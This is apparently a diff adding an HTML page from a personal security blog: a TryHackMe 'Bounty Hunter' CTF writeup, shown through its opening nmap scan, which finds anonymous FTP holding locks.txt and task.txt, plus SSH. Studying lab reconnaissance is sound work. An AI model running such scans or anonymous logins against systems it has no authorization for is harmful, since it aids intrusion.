@@ -1,0 +1,1404 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://tanish-26.github.io/Logic26/CTF/TryHackMe-Bounty-Hunter/">
+      
+      
+        <link rel="prev" href="../HackTheBox-Canvas/">
+      
+      
+        <link rel="next" href="../TryHackMe-Brooklyn-Nine-Nine/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.15">
+    
+    
+      
+        <title>Bounty-Hunter - Logic26</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+   <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#tryhackme-bounty-hunter" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Logic26" class="md-header__button md-logo" aria-label="Logic26" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Logic26
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Bounty-Hunter
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Tanish-26/Logic26/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Tanish-26/Logic26/
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Logic26" class="md-nav__button md-logo" aria-label="Logic26" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Logic26
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Tanish-26/Logic26/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Tanish-26/Logic26/
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Blogs
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Blogs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Blogs/insecure_firebase_blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hunting for Firebase Enums in Android Application
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Blogs/EXPLOIT_SECURITY_IoT_CTF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Exploit Security IOT CTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Blogs/Introduction-to-Insecure-Deserialization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to Insecure Deserilazation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Blogs/PortSwigger-Insecure-Deseleraization-Part-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PortSwigger Insecure Deseleraization Part 1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Blogs/PortSwigger-Insecure-Deseleraization-Part-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PortSwigger Insecure Deseleraization Part 2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    CTF Writeups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            CTF Writeups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    HackTheBox
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Hackthebox_Photonlocakdown/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Photon Lockdown
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Hackthebox_The_Needle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Needle
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-Behind-the-Scenes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Behind The Scenes
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-Cat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cat
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-Debugging-Interface/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Debbing Interface
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-Jscalc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Jscalc
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-RFlag/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    RFlag
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-Signals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Signals
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-Topology/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Topology
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-Toxic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Toxic
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-LoveTok/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LoveTok
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-Analytics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Analytics
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-Weather-App/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Weather App
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-M0rsarchive/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    M0rsarchive
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-RenderQuest/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    RenderQuest
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-Illumination/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Illumination
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackTheBox-Canvas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Canva
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Tryhackme
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Tryhackme
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bounty-Hunter
+    
+  </span>
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TryHackMe-Brooklyn-Nine-Nine/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Brooklyn-Nine-Nine
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TryHackMe-Committed/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Committed
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TryHackMe-Git-Happens/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Git-Happens
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TryHackMe-Grep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Grep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TryHackMe-HeartBleed/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    HeartBleed
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TryHackMe-Pickle-Rick/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pickle Rick
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TryHackMe-TakeOver/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TakeOver
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../TryHackMe-TomGhost/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TomGhost
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="tryhackme-bounty-hunter">TryHackMe Bounty Hunter</h1>
+<p><a class="glightbox" href="../../assets/bounty_hunter1.webp" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="Open Lightbox" class="glightbox center" src="../../assets/bounty_hunter1.webp" width="600" /></a>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>TryhackMe Machine:- Bounty Hunter
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Machine Info:- 
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Machine Level:- Easy
+</span></code></pre></div></p>
+<hr />
+<p>Lets start with an quick nmap scan and see which ports are open and working.</p>
+<p>Nmap Scan</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">967</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>,<span class="w"> </span><span class="m">30</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="m">21</span>/tcp<span class="w"> </span>open<span class="w">  </span>ftp<span class="w">     </span>vsftpd<span class="w"> </span><span class="m">3</span>.0.3<span class="p">|</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>ftp-syst:<span class="w"> </span><span class="p">|</span><span class="w">   </span>STAT:<span class="w"> </span><span class="p">|</span><span class="w"> </span>FTP<span class="w"> </span>server<span class="w"> </span>status:<span class="p">|</span><span class="w">      </span>Connected<span class="w"> </span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>to<span class="w"> </span>::ffff:10.17.33.72<span class="p">|</span><span class="w">      </span>Logged<span class="w"> </span><span class="k">in</span><span class="w"> </span>as<span class="w"> </span>ftp<span class="p">|</span><span class="w">      </span>TYPE:<span class="w"> </span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>ASCII<span class="p">|</span>No<span class="w"> </span>session<span class="w"> </span>bandwidth<span class="w"> </span>limit<span class="p">|</span><span class="w">      </span>Session<span class="w"> </span>timeout<span class="w"> </span><span class="k">in</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>seconds<span class="w"> </span>is<span class="w"> </span><span class="m">300</span><span class="p">|</span><span class="w"> </span>Control<span class="w"> </span>connection<span class="w"> </span>is<span class="w"> </span>plain<span class="w"> </span>text<span class="p">|</span><span class="w">      </span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>Data<span class="w"> </span>connections<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>plain<span class="w"> </span>text<span class="p">|</span><span class="w">      </span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>At<span class="w"> </span>session<span class="w"> </span>startup,<span class="w"> </span>client<span class="w"> </span>count<span class="w"> </span>was<span class="w"> </span><span class="m">4</span><span class="p">|</span><span class="w">      </span>vsFTPd<span class="w"> </span><span class="m">3</span>.0.3
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>-<span class="w"> </span>secure,<span class="w"> </span>fast,<span class="w"> </span>stable<span class="p">|</span>_End<span class="w"> </span>of<span class="w"> </span>status<span class="p">|</span><span class="w"> </span>ftp-anon:<span class="w"> </span>Anonymous<span class="w"> </span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>FTP<span class="w"> </span>login<span class="w"> </span>allowed<span class="w"> </span><span class="o">(</span>FTP<span class="w"> </span>code<span class="w"> </span><span class="m">230</span><span class="o">)</span><span class="p">|</span><span class="w"> </span>-rw-rw-r--<span class="w">    </span><span class="m">1</span><span class="w"> </span>ftp<span class="w">      </span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>ftp<span class="w">           </span><span class="m">418</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">07</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>locks.txt<span class="p">|</span>_<span class="w"> </span>-rw-rw-r--<span class="w">    </span><span class="m">1</span><span class="w"> </span>ftp<span class="w">      </span>ftp<span class="w">            </span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="m">68</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">07</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>task.txt22/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">    </span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>OpenSSH<span class="w"> </span><span class="m">7</span>.2p2<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu2.8<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span><span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span><span class="p">|</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="m">2048</span><span class="w"> </span>dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span><span class="p">|</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="m">256</span><span class="w"> </span>ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span><span class="p">|</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
